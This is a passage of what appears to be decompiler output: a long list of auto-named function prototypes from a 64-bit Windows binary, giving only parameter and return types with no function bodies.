int *__fastcall sub_140078A90(__int64 *a1, _QWORD *a2, __int64 a3, __int64 a4, int *a5);
int *__fastcall sub_140078EA0(__int64 *a1, _QWORD *a2, __int64 a3, int *a4);
__int64 __fastcall sub_140078EC0(__int64 a1, _QWORD *a2);
_BOOL8 __fastcall sub_140078F50(__int64 a1, __int64 a2);
__int64 __fastcall sub_140078F70(__int64 *a1, __int64 a2, int *a3);
__int64 __fastcall sub_1400790F0(__int64 a1, __int64 a2, __int64 a3, int *a4);
__int64 __fastcall sub_140079290(__int64 a1, __int64 a2, int *a3);
__int64 __fastcall sub_1400793B0(__int64 a1, unsigned __int64 a2, __int64 a3, __int64 a4);
__int64 __fastcall sub_140079440(__int64 a1, __int64 a2, __int64 a3, __int64 a4, int *a5);
__int64 __fastcall sub_140079470(__int64 a1, __int64 a2, __int64 a3, int *a4);
_BOOL8 __fastcall sub_1400794A0(__int64 a1, __int64 a2, __int64 a3, __int64 a4, int *a5);
void *sub_1400794D0();
__int64 __fastcall sub_1400794E0(__int64 a1, __int64 a2, __int64 a3, __int64 a4, int *a5);
__int64 __fastcall sub_140079530(__int64 *a1, __int64 a2, __int64 a3, __int64 *a4);
__int64 __fastcall sub_1400795A0(__int64 a1, __int64 a2, __int64 *a3);
__int64 __fastcall sub_140079610(__int64 *a1, __int64 a2, int a3, __int64 *a4);
__int64 __fastcall sub_140079710(__int64 a1, __int64 a2, __int64 a3, __int64 a4, int *a5);
__int64 __fastcall sub_1400797D0(__int64 a1, __int64 a2, __int64 a3, int *a4);
__int64 __fastcall sub_140079840(__int64 a1, __int64 a2, __int64 a3, __int64 a4, int *a5);
__int64 __fastcall sub_140079890(__int64 a1, __int64 a2, __int64 a3, __int64 a4);
__int64 __fastcall sub_1400798F0(__int64 a1, __int64 a2, __int64 a3, int *a4);
__int64 __fastcall sub_140079970(__int64 a1, __int64 a2, int *a3);
__int64 *__fastcall sub_140079C00(__int64 *a1, __int64 a2, unsigned __int64 a3, int *a4);
__int64 __fastcall sub_14007A380(__int64 a1, __int64 a2, __int64 a3);
__int64 __fastcall sub_14007A460(__int64 a1, __int64 a2, __int64 a3);
__int64 __fastcall sub_14007A500(__int64 a1, __int64 a2, _DWORD *a3);
_BOOL8 __fastcall sub_14007A790(__int64 a1, __int64 a2, __int64 a3, __int64 a4, int *a5);
__int64 __fastcall sub_14007A840(__int64 a1, __int64 a2, __int64 a3, _DWORD *a4, int *a5);
__int64 __fastcall sub_14007A990(__int64 a1, __int64 a2, __int64 a3, int *a4);
__int64 __fastcall sub_14007AEA0(__int64 a1, __int64 a2, __int64 a3, __int64 a4, int *a5);
__int64 __fastcall sub_14007AF90(__int64 a1, __int64 a2, __int64 a3, _DWORD *a4, int *a5);
__int64 __fastcall sub_14007B2C0(__int64 a1, __int64 a2, int *a3, int *a4);
__int64 __fastcall sub_14007B640(__int64 a1, __int64 a2, _DWORD *a3, int *a4);
__int64 __fastcall sub_14007B850(__int64 a1, __int64 a2, _DWORD *a3, int *a4);
__int64 __fastcall sub_14007B900(__int64 a1, __int64 a2, int a3);
unsigned __int64 __fastcall sub_14007B9E0(unsigned __int64 *a1, unsigned __int64 *a2, unsigned __int64 a3, unsigned __int64 a4);
__int64 __fastcall sub_14007BD10(_QWORD *a1, __int64 a2, __int64 a3, unsigned __int64 a4, int *a5);
__int64 __fastcall sub_14007BDF0(__int64 a1, __int64 a2, __int64 a3, unsigned __int64 a4, int *a5, __int64 a6);
__int64 __fastcall sub_14007C360(__int64 a1, __int64 *a2, __int64 a3, unsigned __int64 a4, int *a5, __int64 a6);
__int64 __fastcall sub_14007CA40(__int64 a1, unsigned __int64 a2, __int64 a3, __int64 a4, int *a5, __int64 a6);
__int64 __fastcall sub_14007CE60(_QWORD *a1, __int64 a2, __int64 a3, __int64 a4, int *a5);
__int64 __fastcall sub_14007D240(__int64 a1, int a2, __int64 a3, int a4, int a5);
__int64 __fastcall sub_14007D4F0(__int64 a1, const char *a2, int a3);
__int64 __fastcall sub_14007D570(__int64 a1, char *a2, int a3);
__int64 __fastcall sub_14007D600(__int64 a1, const char *a2);
__int64 __fastcall sub_14007D650(_DWORD *a1, int a2, int a3, _DWORD *a4);
__int64 __fastcall sub_14007D7C0(_DWORD *a1);
__int64 __fastcall sub_14007D810(int a1);
_BOOL8 __fastcall sub_14007D880(int a1);
__int64 __fastcall sub_14007D8B0(int *a1);
__int64 __fastcall sub_14007D930(__int64 a1, __int64 a2);
int __fastcall sub_14007D950(__int64 a1, __int64 a2);
__int64 __fastcall sub_14007D9A0(int *a1);
__int64 __fastcall sub_14007DA40(__int64 *a1, int *a2);
__int64 __fastcall sub_14007DA60(__int64 a1, int a2);
__int64 __fastcall sub_14007DA80(__int64 a1, __int64 a2);
_DWORD *__fastcall sub_14007DAA0(__int64 a1, _DWORD *a2);
__int64 __fastcall sub_14007DAC0(unsigned __int64 *a1, __int64 a2, unsigned __int64 a3, int a4);
__int64 __fastcall sub_14007DBB0(__int64 *a1, __int64 a2, unsigned __int64 a3);
__int64 __fastcall sub_14007DC30(__int64 *a1, int *a2, int a3);
__int64 __fastcall sub_14007DCF0(__int64 a1, __int64 a2, int a3);
__int64 __fastcall sub_14007DD90(__int64 a1, __int64 a2, int a3);
_DWORD *__fastcall sub_14007DE50(__int64 a1, _DWORD *a2, int a3);
__int64 __fastcall sub_14007DF60(__int64 *a1, char **a2, int a3);
__int64 __fastcall sub_14007E120(_BYTE *a1, int *a2, char *a3, unsigned __int64 a4);
__int64 __fastcall sub_14007E280(unsigned __int8 **a1, unsigned __int8 **a2);
__int64 __fastcall sub_14007E2B0(unsigned __int8 *a1, unsigned __int64 a2, int a3, unsigned __int8 **a4);
void *sub_14007E3C0();
__int64 __fastcall sub_14007E3D0(int a1, __int64 *a2);
__int64 __fastcall sub_14007E430(__int64 *a1, char **a2, __int64 a3);
__int64 __fastcall sub_14007E450(__int64 *a1, char **a2, unsigned int a3);
__int64 __fastcall sub_14007E570(unsigned int *a1, unsigned __int8 **a2);
__int64 __fastcall sub_14007E590(__int64 a1, unsigned __int8 **a2);
__int64 *__fastcall sub_14007E630(__int64 a1, _DWORD *a2);
__int64 __fastcall sub_14007E6B0(__int64 a1);
__int64 __fastcall sub_14007E6D0(__int64 a1, _QWORD *a2, _QWORD *a3, _QWORD *a4);
__int64 __fastcall sub_14007E740(__int64 a1);
__int64 __fastcall sub_14007E870(__int64 a1, __int64 a2);
__int64 *__fastcall sub_14007E9D0(__int64 a1, __int64 a2);
__int64 __fastcall sub_14007EBA0(__int64 a1, unsigned int a2);
void __fastcall sub_14007EC90(__int64 a1);
void __fastcall sub_14007ED50(__int64 a1);
__int64 __fastcall sub_14007EE10(__int64 a1, _QWORD *a2, _QWORD *a3);
__int64 __fastcall sub_14007EE80(__int64 a1);
__int64 __fastcall sub_14007EEA0(__int64 a1, _QWORD *a2, _QWORD *a3, _QWORD *a4, _QWORD *a5, _QWORD *a6);
__int64 __fastcall sub_14007EFA0(__int64 a1, __int64 a2);
__int64 __fastcall sub_14007F0F0(char **a1, _QWORD *a2, char *a3, int a4, __int64 a5, int a6);
__int64 __fastcall sub_14007F270(__int64 a1, unsigned int *a2);
__int64 __fastcall sub_14007F330(__int64 a1, _QWORD *a2);
__int64 __fastcall sub_14007F340(_QWORD *a1, _QWORD *a2, _QWORD *a3, _QWORD *a4);
__int64 __fastcall sub_14007F370(__int64 a1, int a2, unsigned int a3);
__int64 __fastcall sub_14007F490(_QWORD *a1, __int64 a2);
__int64 __fastcall sub_14007F560(_QWORD *a1, _QWORD *a2, _QWORD *a3, _QWORD *a4, _QWORD *a5);
__int64 __fastcall sub_14007F5A0(__int64 a1);
__int64 __fastcall sub_14007F5B0(__int64 a1);
__int64 __fastcall sub_14007F850(__int64 *a1, int *a2);
_QWORD *__fastcall sub_14007F920(__int64 *a1);
__int64 __fastcall sub_14007FA20(__int64 a1, __int64 a2, int *a3);
__int64 __fastcall sub_14007FD10(__int64 a1, unsigned int a2);
__int64 __fastcall sub_14007FDB0(__int64 a1);
__int64 __fastcall sub_14007FF00(__int64 a1, __FrameHandler3::TryBlockMap *a2, int a3);
__int64 __fastcall sub_140080410(__int64 a1, const char *a2, __int64 a3, unsigned __int64 a4, int a5);
__int64 __fastcall sub_1400805E0(int a1, int **a2);
void *sub_140080670();
void *sub_140080680();
_BOOL8 __fastcall sub_140080690(int a1, __int64 **a2, __int64 a3, __int64 a4);
void *sub_140080720();
void *sub_140080730();
void *sub_140080740();
void *sub_140080750();
void *sub_140080760();
void *sub_140080770();
void *sub_140080780();
void *sub_140080790();
void *sub_1400807A0();
void *sub_1400807B0();
void *sub_1400807C0();
void *sub_1400807D0();
void *sub_1400807E0();
void *sub_1400807F0();
void *sub_140080800();
void *sub_140080810();
void *sub_140080820();
void *sub_140080830();
void *sub_140080840();
void *sub_140080850();
void *sub_140080860();
void *sub_140080870();
__int64 __fastcall sub_140080880(int a1, __int64 *a2);
void *sub_1400808D0();
void *sub_1400808E0();
void *sub_1400808F0();
void *sub_140080900();
__int64 __fastcall sub_140080910(int a1, __int64 a2);
void *sub_140080940();
__int64 __fastcall sub_140080950(int a1, __int64 *a2);
void *sub_1400809C0();
void *sub_1400809D0();
void *sub_1400809E0();
__int64 __fastcall sub_1400809F0(unsigned __int8 **a1, __int64 a2, __int64 a3, int a4);
__int64 __fastcall sub_140080A80(__int64 a1, __int64 a2);
__int64 __fastcall sub_140080BC0(int a1, __int64 *a2);
void __fastcall sub_140080C20(unsigned int *a1);
void *sub_140080C40();
__int64 sub_140080C50();
void __fastcall sub_140080C70(unsigned int *a1);
void *sub_140080C90();
__int64 sub_140080CA0();
__int64 __fastcall sub_140080CC0(__int64 *a1, char **a2, __int64 a3);
__int64 __fastcall sub_140080CE0(__int64 *a1, char **a2, __int64 a3);
__int64 __fastcall sub_140080D00(unsigned int *a1, unsigned __int8 **a2);
__int64 __fastcall sub_140080D20(unsigned int *a1, unsigned __int8 **a2);
__int64 __fastcall sub_140080D40(_BYTE *a1, int a2, const void *a3, unsigned int a4);
__int64 __fastcall sub_140080DF0(_BYTE *a1, int a2, const void *a3, unsigned int a4);
__int64 __fastcall sub_140080EF0(void *a1, int a2, char *a3, int a4, int a5);
__int64 __fastcall sub_1400810A0(void *a1, int a2, const void *a3, int a4, int a5);
__int64 __fastcall sub_140081290(_BYTE *a1, int a2, const void *a3, unsigned int a4);
__int64 __fastcall sub_1400813A0(void *a1, int a2, _BYTE *a3, int a4, int a5);
__int64 __fastcall sub_140081530(void *a1, int a2, const void *a3, signed int a4);
__int64 __fastcall sub_1400815B0(char *a1, int a2, const void *a3, int a4);
__int64 __fastcall sub_140081640(__int64 a1, __int64 a2, _DWORD *a3);
__int64 __fastcall sub_140081760(__int64 a1, __int64 a2, __int64 a3, __int64 a4, __int64 a5, __int64 **a6, int *a7, __int64 a8);
_DWORD *__fastcall sub_140081E40(_QWORD *a1, __int64 a2, int a3);
__int64 __fastcall sub_140081F50(_QWORD *a1, int a2, __int64 a3);
void __fastcall sub_140082030(__int64 *a1, __int64 a2);
void __fastcall sub_1400820A0(__int64 *a1, __int64 a2);
__int64 __fastcall sub_1400820E0(_DWORD *a1, void **a2, _QWORD *a3, __int64 a4);
__int64 __fastcall sub_140082180(__int64 *a1, const void *a2, int a3, __int64 a4);
__int64 __fastcall sub_140082250(_QWORD *a1, __int64 a2);
__int64 __fastcall sub_140082260(_QWORD *a1, __int64 a2);
__int64 __fastcall sub_140082270(_QWORD *a1, int a2, __int64 a3);
void __fastcall sub_140082280(__int64 a1);
unsigned __int64 __fastcall sub_1400822F0(__int64 a1, unsigned __int64 a2);
unsigned __int64 __fastcall sub_140082440(__int64 a1, unsigned __int64 a2);
void *__fastcall sub_1400825B0();
_DWORD *__fastcall sub_140082600(int a1);
__int64 __fastcall sub_140082660(unsigned __int8 *a1, unsigned __int8 *a2, unsigned __int64 a3);
void *__fastcall sub_1400826C0(__int64 a1, size_t a2);
_BOOL8 __fastcall sub_140082730(__int64 a1, int a2);
__int64 __fastcall sub_140082780(int *a1, int a2, int a3);
_DWORD *__fastcall sub_1400828C0(_QWORD *a1, _QWORD *a2, int a3);
__int64 __fastcall sub_140082A20(int *a1, _BYTE **a2);
__int64 __fastcall sub_140082B40(unsigned int *a1, unsigned int *a2, unsigned int *a3, unsigned int *a4);
__int64 __fastcall sub_140082CA0(unsigned __int16 *a1, __int64 a2, int a3, __int64 a4, unsigned int *a5, unsigned int *a6, unsigned __int16 *a7, int a8);
__int64 __fastcall sub_140083220(_DWORD *a1, unsigned int *a2, int a3);
__int64 __fastcall sub_140084620(_DWORD *a1, unsigned int *a2, int a3);
__int64 __fastcall sub_1400858A0(unsigned int *a1, unsigned int *a2, unsigned int *a3, unsigned int *a4);
__int64 __fastcall sub_140085A00(unsigned __int16 *a1, __int64 a2, unsigned int a3, unsigned int *a4, unsigned __int16 *a5, int a6);
__int64 __fastcall sub_140085F80(__int64 a1, __int64 a2, int a3, unsigned int a4, unsigned int *a5, unsigned __int8 *a6, int a7);
__int64 __fastcall sub_1400866A0(unsigned __int8 *a1, __int64 a2, unsigned int *a3, int a4);
__int64 __fastcall sub_140086770(unsigned __int16 *a1, _DWORD *a2);
__int64 __fastcall sub_140086A20(unsigned __int8 *a1);
char __fastcall sub_140086A80(char *a1, _BYTE *a2, int a3, unsigned int *a4, unsigned __int16 *a5, int *a6, int a7);
__int64 __fastcall sub_140086CB0(_BYTE *a1, __int64 a2, int a3, __int64 a4, unsigned __int8 *a5, int *a6);
__int64 __fastcall sub_140086EA0(unsigned __int8 *a1, __int64 a2, unsigned int *a3, unsigned int *a4, unsigned int *a5, int a6);
char sub_140086F90(char *a1, _BYTE *a2, int a3, unsigned int *a4, unsigned int *a5, unsigned int *a6, ...);
unsigned __int8 *__fastcall sub_140087210(__int64 a1, __int64 a2, int a3, unsigned int a4, unsigned int *a5, unsigned int *a6, unsigned int *a7, unsigned __int8 *a8, int a9);
__int64 __fastcall sub_140087AA0(_BYTE *a1, __int64 a2, int a3, __int64 a4, unsigned int *a5, unsigned int *a6, unsigned __int8 *a7, int *a8);
_BYTE *__fastcall sub_140087CB0(unsigned int *a1, size_t a2, _BYTE *a3);
__int64 __fastcall sub_140087D50(unsigned __int16 *a1, __int64 a2, unsigned int a3, unsigned int *a4, _BYTE *a5, unsigned __int16 *a6, unsigned __int16 *a7, int a8);
__int64 __fastcall sub_140088420(__int64 a1, __int64 a2);
__int64 __fastcall sub_140088590(_DWORD *a1);
__int64 __fastcall sub_1400885E0(__int64 a1, unsigned __int8 *a2, size_t a3);
void __fastcall sub_140088710(int *a1, unsigned __int8 *a2, __int64 a3);
__int64 __fastcall sub_1400891A0(__int64 a1, _BYTE *a2, _DWORD *a3);
__int64 __fastcall sub_140089260(__int64 a1, int *a2);
_DWORD *__fastcall sub_1400893B0(unsigned __int8 *a1, _DWORD *a2);
__int64 __fastcall sub_140089520(__int64 a1, _BYTE *a2, unsigned int a3, _DWORD *a4, unsigned int *a5, int a6);
__int64 __fastcall sub_140089A90(int *a1, _DWORD *a2);
unsigned __int8 __fastcall sub_14008A290(unsigned __int8 *a1, unsigned __int8 *a2, int a3, _DWORD *a4, unsigned __int8 *a5, int *a6, int a7);
__int64 __fastcall sub_14008A4B0(_BYTE *a1, __int64 a2, int a3, __int64 a4, unsigned __int8 *a5, int *a6);
unsigned __int8 *__fastcall sub_14008A6A0(_BYTE *a1, int a2, __int64 a3, int a4);
__int64 __fastcall sub_14008A800(unsigned __int8 *a1, __int64 a2, __int64 a3, int a4);
__int64 __fastcall sub_14008A8D0(unsigned __int16 *a1, __int64 a2, unsigned int a3, __int64 a4, int *a5, int a6);
__int64 __fastcall sub_14008AE30(int *a1, __int64 a2);
__int64 __fastcall sub_14008AF80(int *a1, __int64 a2);
char __fastcall sub_14008B0D0(char *a1, _BYTE *a2, int a3, __int64 a4, unsigned __int16 *a5, int *a6, int a7);
__int64 __fastcall sub_14008B2F0(_BYTE *a1, __int64 a2, int a3, __int64 a4, unsigned __int8 *a5, int *a6);
__int64 __fastcall sub_14008B4D0(_DWORD *a1, int a2, unsigned __int8 *a3);
__int64 __fastcall sub_14008B670(__int64 a1, _BYTE *a2, _DWORD *a3, int a4);
__int64 __fastcall sub_14008B740(__int64 a1, _BYTE *a2, unsigned int a3, _DWORD *a4, unsigned int *a5, int a6);
__int64 __fastcall sub_14008BCB0(unsigned int *a1, _DWORD *a2);
__int64 __fastcall sub_14008C150(unsigned int *a1, _DWORD *a2);
unsigned __int8 __fastcall sub_14008C5F0(unsigned __int8 *a1, unsigned __int8 *a2, int a3, _DWORD *a4, unsigned __int8 *a5, int *a6, int a7);
__int64 __fastcall sub_14008C810(_BYTE *a1, __int64 a2, int a3, __int64 a4, unsigned __int8 *a5, int *a6);
__int64 __fastcall sub_14008CA00(__int64 a1, int a2, __int64 a3);
__int64 __fastcall sub_14008E080(__int64 a1, _BYTE *a2, _DWORD *a3, int a4);
__int64 __fastcall sub_14008E150(__int64 a1, _BYTE *a2, unsigned int a3, _DWORD *a4, unsigned int *a5, int a6);
__int64 __fastcall sub_14008E6C0(int *a1, _DWORD *a2);
unsigned __int64 __fastcall sub_14008EBA0(int *a1, _DWORD *a2);
unsigned __int8 __fastcall sub_14008F070(unsigned __int8 *a1, unsigned __int8 *a2, int a3, _DWORD *a4, unsigned __int8 *a5, int *a6, int a7);
__int64 __fastcall sub_14008F290(_BYTE *a1, __int64 a2, int a3, __int64 a4, unsigned __int8 *a5, int *a6);
__int64 __fastcall sub_14008F480(_DWORD *a1, unsigned int *a2, unsigned int *a3);
__int64 __fastcall sub_14008FA50(_DWORD *a1, unsigned int *a2, unsigned int *a3);
__int64 __fastcall sub_140090050(_DWORD *a1, int a2, unsigned int *a3);
__int64 __fastcall sub_1400902A0(_DWORD *a1, int a2, unsigned int *a3);
void __fastcall sub_140090880(char *a1, char *a2, unsigned __int64 a3, __int64 a4, char *a5, __int64 a6);
void __fastcall sub_1400908C0(__int64 *a1, __int64 *a2, unsigned __int64 a3, __int64 a4, char *a5, void (__fastcall *a6)(__int64 *, __int64 *, __int64));
void __fastcall sub_140090B90(char *a1, char *a2, unsigned __int64 a3, __int64 a4, _OWORD *a5, void (__fastcall *a6)(char *, char *, __int64));
void __fastcall sub_140090D60(_BYTE *a1, _BYTE *a2, unsigned __int64 a3, __int64 a4, __int64 a5, __int64 a6, unsigned int *a7, void (__fastcall *a8)(__int64, __int64, __int64));
__int64 __fastcall sub_140090F60(_BYTE *a1, _BYTE *a2, unsigned __int64 a3, __int64 a4, unsigned __int8 *a5, _QWORD *a6, unsigned int *a7, void (__fastcall *a8)(_BYTE *, _BYTE *, unsigned __int64));
void __fastcall sub_1400911D0(_BYTE *a1, _BYTE *a2, unsigned __int64 a3, __int64 a4, __int64 a5, unsigned int *a6, void (__fastcall *a7)(__int64, __int64, __int64));
void __fastcall sub_140091340(__int64 a1, __int64 a2, unsigned __int64 a3, __int64 a4, __int128 *a5, int a6, int a7, void (__fastcall *a8)(__int128 *, __int128 *, __int64));
char __fastcall sub_140091520(char *a1, __int64 a2, __int64 a3, __int64 a4, _OWORD *a5, int a6, int a7, void (__fastcall *a8)(_OWORD *, _OWORD *, __int64));
char __fastcall sub_1400915F0(_BYTE *a1, _BYTE *a2, unsigned __int64 a3, __int64 a4, __int64 a5, unsigned int *a6, int a7, __int64 (__fastcall *a8)(__int64, __int64, __int64));
__int64 __fastcall sub_140091880(__int64 a1, char *a2, unsigned __int64 a3);
__int64 __fastcall sub_1400919B0(__int64 a1, __int64 a2, _QWORD *a3, unsigned __int64 a4);
__int64 __fastcall sub_140091CE0(__int64 a1, char *a2, _BYTE *a3, unsigned __int64 a4, void (__fastcall *a5)(char *, _BYTE *, __int64, __int64, __int64));
__int64 __fastcall sub_140091F90(__int64 a1, _QWORD *a2, _QWORD *a3, unsigned __int64 a4);
__int64 __fastcall sub_1400922E0(__int64 a1, _BYTE *a2, _BYTE *a3, unsigned __int64 a4, void (__fastcall *a5)(_BYTE *, _BYTE *, __int64, __int64, __int64));
__int64 __fastcall sub_1400925A0(__int64 a1, __int64 a2, unsigned __int64 a3);
unsigned __int64 __fastcall sub_140092710(__m128i *a1, __int64 a2, void (__fastcall *a3)(__m128i *, __m128i *, __int64));
__int64 __fastcall sub_140092830(unsigned __int64 a1, const __m128i *a2, unsigned __int64 a3);
void *__fastcall sub_140092AB0(__int64 a1, void *a2, unsigned __int64 a3);
unsigned __int64 __fastcall sub_140092B10(_BYTE *a1, __int64 a2, __int64 a3, __int64 a4);
__int64 __fastcall sub_140092CE0(_BYTE *a1, __int64 a2);
unsigned __int64 __fastcall sub_140092E50(__m128i *a1, __m128i *a2);
void __fastcall sub_140093080(__int64 a1, _BYTE *a2, unsigned __int64 a3);
__int64 __fastcall sub_1400931E0(char *a1, _QWORD *a2, __int64 *a3, unsigned __int64 a4);
__int64 __fastcall sub_1400933C0(char *a1, __int64 a2, __int64 a3, __int64 a4, void (__fastcall *a5)(__int64, __int64, unsigned __int64, __int64, char *, __int64));
__int64 __fastcall sub_1400935D0(char *a1, _QWORD *a2, _QWORD *a3, unsigned __int64 a4);
__int64 __fastcall sub_140093890(char *a1, unsigned __int64 a2, unsigned __int64 a3, unsigned __int64 a4, void (__fastcall *a5)(unsigned __int64, unsigned __int64, unsigned __int64, __int64, char *, __int64));
__int64 __fastcall sub_140093B60(_QWORD *a1, int a2, char a3, __int64 a4, __int64 a5);
__int64 __fastcall sub_140093BA0(char *a1, const void *a2, unsigned __int64 a3, __int64 a4);
unsigned __int64 __fastcall sub_140093C50(unsigned __int8 *a1, void *a2, unsigned __int64 a3);
__int64 __fastcall sub_140093CA0(__int64 *a1, __m128i *a2, _QWORD *a3, __int64 a4, unsigned __int64 a5, int a6);
__int64 __fastcall sub_140093F00(__int64 a1, void *a2, char *a3, __int64 *a4, __int64 a5, void (__fastcall *a6)(__int64 *, __int64 *, __int64));
unsigned __int64 __fastcall sub_140093FA0(__int64 a1, int *a2, __int64 *a3, const void *a4, size_t Size, void (__fastcall *a6)(__int64 *, __int64 *, __int64));
__int64 __fastcall sub_140094120(__int64 a1, __int64 *a2, _QWORD *a3, const void *a4, size_t Size, void (__fastcall *a6)(__int64 *, __int64 *, __int64));
__int64 __fastcall sub_140094290(__int64 a1, int *a2, __int64 *a3, const void *a4, size_t Size, void (__fastcall *a6)(__int64 *, __int64 *, __int64));
__int64 __fastcall sub_1400943C0(__int64 a1, _QWORD *a2, char *a3, __int64 *a4, __int64 a5, void (__fastcall *a6)(__int64 *, __int64 *, __int64));
__int64 __fastcall sub_140094530(void (__fastcall **a1)(__int64 *, __int64 *, __int64), __int64 a2, unsigned __int64 a3);
__int64 __fastcall sub_1400946E0(__int64 a1);
__int64 __fastcall sub_140094730(__int64 a1, __int64 a2, __int64 a3, __int64 a4);
__int64 __fastcall sub_140094830(__int64 a1, __int64 a2, __int64 a3, unsigned __int64 a4);
__int64 __fastcall sub_140094A90(__int64 a1, __int64 a2, __int64 a3, unsigned __int64 a4);
__int64 __fastcall sub_140094CF0(__int64 a1, __int64 a2, __int64 a3);
__int64 __fastcall sub_140094DC0(_QWORD *a1, __int64 a2, __int64 a3, void (__fastcall *a4)(_QWORD *, _QWORD *, __int64), __int64 a5, __int64 a6);
__int64 __fastcall sub_140094F70(__int64 a1, const void *a2, size_t a3, __int64 a4);
__int64 __fastcall sub_140095140(__int64 a1, void *a2, size_t a3);
__int64 __fastcall sub_1400951B0(__int64 a1, char a2, __int64 a3);
void __fastcall sub_140095260(unsigned __int64 a1, const __m128i *a2, unsigned __int64 a3, unsigned __int64 a4);
void *__fastcall sub_140095350(_QWORD *a1, unsigned __int64 a2);
__int64 __fastcall sub_140095470(unsigned __int8 *a1, _BYTE *a2, __int64 a3);
__int64 __fastcall sub_1400954A0(unsigned __int8 *a1, _BYTE *a2, _DWORD *a3);
__int64 __fastcall sub_1400954D0(unsigned __int8 *a1, int a2, unsigned int *a3);
void __fastcall sub_140095530(char *a1, char *a2, unsigned __int64 a3, __int64 a4, char *a5, __int64 a6);
_OWORD *__fastcall sub_140095570(unsigned __int64 a1, unsigned __int64 a2, unsigned __int64 a3, __int128 *a4, _OWORD *a5);
__int128 *__fastcall sub_140095730(unsigned __int64 a1, __int128 *a2);
__int64 __fastcall sub_140095A80(__int64 a1, __int64 a2);
__int64 __fastcall sub_140095B20(__int64 a1, unsigned __int8 *a2);
__int64 __fastcall sub_140095C80(__int64 a1, char *a2, size_t a3);
__int64 sub_140095D70();
__int64 __fastcall sub_140095D80(unsigned int *a1, __int64 a2, unsigned __int64 a3, int a4);
__int64 __fastcall sub_1400960B0(unsigned int *a1, __int64 a2, unsigned int *a3);
__int64 __fastcall sub_140096220(unsigned __int8 *a1, _BYTE *a2, __int64 a3);
__int64 __fastcall sub_1400970C0(unsigned __int8 *a1, _BYTE *a2, __int64 a3);
__int64 __fastcall sub_140097F60(unsigned __int8 *a1, int *a2);
__int64 __fastcall sub_140098AC0(unsigned __int8 *a1, _BYTE *a2, __int64 a3, int a4);
void __fastcall sub_140098AF0(char *a1, char *a2, unsigned __int64 a3, __int64 a4, char *a5, __int64 a6);
char __fastcall sub_140098B30(_BYTE *a1, _BYTE *a2, unsigned __int64 a3, __int64 a4, __int64 a5, unsigned int *a6, int a7);
void __fastcall sub_140098B80(_BYTE *a1, _BYTE *a2, unsigned __int64 a3, __int64 a4, __int64 a5, unsigned int *a6);
__int64 __fastcall sub_140098BC0(__int64 a1, __int64 a2);
__int64 __fastcall sub_140098D30(__int64 a1, unsigned __int8 *a2, size_t a3);
void __fastcall sub_140098E60(int *a1, unsigned __int8 *a2, __int64 a3);
__int64 __fastcall sub_140099660(char *a1, __m128i *a2);
__int64 __fastcall sub_1400996F0(_QWORD *a1);
__int64 __fastcall sub_140099770(__m128i *a1, __m128i *a2, unsigned __int64 a3);
unsigned __int64 __fastcall sub_140099850(__int64 *a1, __m128i *a2, unsigned __int64 a3);
__int64 __fastcall sub_14009BD60(_QWORD *a1, __int64 a2);
__int64 __fastcall sub_14009BE20(char *a1, __m128i *a2);
__int64 __fastcall sub_14009BEB0(_OWORD *a1);
__int64 __fastcall sub_14009BF70(__m128i *a1, __m128i *a2, unsigned __int64 a3);
unsigned __int64 __fastcall sub_14009C050(__int64 a1, __m128i *a2, unsigned __int64 a3);
__int64 __fastcall sub_14009DB40(_QWORD *a1, unsigned int *a2);
__int64 __fastcall sub_14009DBC0(__int64 a1);
__int64 __fastcall sub_14009DBF0(unsigned __int8 *a1, unsigned __int8 *a2, size_t a3);
__int64 __fastcall sub_14009DCB0(__int64 a1, unsigned __int8 *a2, __int64 a3);
__int64 __fastcall sub_14009DEB0(__int64 a1, int *a2);
__int64 __fastcall sub_14009E040(__int64 a1, unsigned __int8 *a2, size_t a3);
void __fastcall sub_14009E170(_DWORD *a1, unsigned __int8 *a2, __int64 a3);
char __fastcall sub_14009F940(__int64 a1, _BYTE *a2, unsigned __int64 a3);
__int64 __fastcall sub_14009FC00(_OWORD *a1, __int64 a2);
__int64 __fastcall sub_14009FD60(void *a1);
__int64 __fastcall sub_14009FD90(__int64 a1, char *a2, unsigned __int64 a3);
_BOOL8 sub_1400A0010();
__int64 __fastcall sub_1400A0040(__int64 a1, __int64 a2);
_BOOL8 sub_1400A0240();
void sub_1400A0270();
__int64 __fastcall sub_1400A0290(__int64 a1, __int64 a2);
_BOOL8 sub_1400A0660();
__int64 __fastcall sub_1400A0690(__int64 a1, __int64 a2);
_BOOL8 sub_1400A0820();
__int64 __fastcall sub_1400A0850(__int64 a1);
void sub_1400A08C0();
__int64 __fastcall sub_1400A0920(__int64 a1, __int64 a2);
void *__fastcall sub_1400A0D90(__int64 a1);
__int64 __fastcall sub_1400A0E00(_QWORD *a1);
__int64 __fastcall sub_1400A0E30(_QWORD *a1);
__int64 __fastcall sub_1400A0E60(void *a1);
__int64 __fastcall sub_1400A0EB0(__int64 a1);
__int64 __fastcall sub_1400A0EE0(__int64 a1, const CHAR *a2, unsigned int *a3);
__int64 __fastcall sub_1400A0FB0(__int64 a1, __int64 a2, unsigned int *a3);
__int64 __fastcall sub_1400A1780(__int64 a1, __int64 a2);
__int64 __fastcall sub_1400A17B0(__int64 a1, unsigned __int8 a2);
__int64 __fastcall sub_1400A17C0(__int64 a1, char a2);
char **sub_1400A17D0();
__int64 __fastcall sub_1400A17E0(__int64 a1, char *a2);
__int64 __fastcall sub_1400A1920(const char **a1, __int64 a2);
unsigned __int8 *__fastcall sub_1400A1970(__int64 a1, unsigned __int8 *a2);
__int64 __fastcall sub_1400A19C0(__int64 a1, const char *a2, void **a3, char *a4);
__int64 __fastcall sub_1400A1E60(__int64 a1, _QWORD *a2, _QWORD *a3);
void __fastcall sub_1400A1F20(__int64 a1);
_QWORD *__fastcall sub_1400A1F80(__int64 a1, __int64 a2);
__int64 __fastcall sub_1400A1FC0(__int64 a1, __int64 a2);
__int64 __fastcall sub_1400A2010(__int64 a1, const char *a2, char *a3);
_BOOL8 __fastcall sub_1400A2100(__int64 a1);
_QWORD *__fastcall sub_1400A2150(__int64 a1, _BYTE *a2);
__int64 __fastcall sub_1400A2280(unsigned __int8 **a1, unsigned __int8 **a2);
__int64 __fastcall sub_1400A2310(char **a1);
__int64 __fastcall sub_1400A2350(__int64 a1, __int64 a2);
void __fastcall sub_1400A2380(__int64 a1);
_DWORD *__fastcall sub_1400A2460(int a1, _DWORD **a2, char **a3, unsigned int a4);
void __fastcall sub_1400A25D0(unsigned int *a1);
void *sub_1400A25F0();
__int64 __fastcall sub_1400A2600(__int64 *a1, char **a2, __int64 a3);
__int64 __fastcall sub_1400A2620(unsigned int *a1, unsigned __int8 **a2);
